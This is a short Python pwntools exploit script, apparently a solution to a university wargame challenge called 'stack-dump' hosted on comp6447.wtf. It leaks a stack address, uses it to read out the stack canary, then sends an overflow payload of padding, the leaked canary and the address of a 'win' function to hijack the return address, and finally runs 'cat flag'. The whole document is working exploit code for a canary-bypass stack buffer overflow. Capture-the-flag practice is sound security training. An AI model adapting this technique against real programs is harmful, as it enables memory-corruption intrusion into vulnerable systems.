from pwn import *
from pwnlib.util.packing import p32

p = remote('comp6447.wtf', 24973)
elf = ELF('./wargame2/stack-dump')


p.recvuntil(b'pointer ', drop=True)
# ebp-0x71 contains stack pointer at the beginning
# ebp-0x8 contains stack canary value
stk_ptr = p32(int(p.recvline(), 16) + 0x71 - 0x8)
log.info(f"The stack pointer is {stk_ptr}")

p.recvuntil(b'quit', drop=True)
p.sendline(b"a")

p.recvuntil(b'len: ', drop=True)
p.sendline(stk_ptr)

p.recvuntil(b'quit', drop=True)
p.sendline(b'b')

p.recvline()
canary = p.recvline()
canary = canary[22:26]
log.info(f"Canary: {canary}")

p.recvuntil(b'quit', drop=True)
p.sendline(b"a")

# The distance from the input to the return address is 108 bytes
# padding + canary + padding + return address
payload = b'A'*96 + canary + b'A'*8 + p32(elf.symbols['win'])
p.sendline(payload)

p.recvuntil(b'quit', drop=True)
p.sendline(b'd')

p.sendline(b"cat flag")

p.interactive()
p.close()

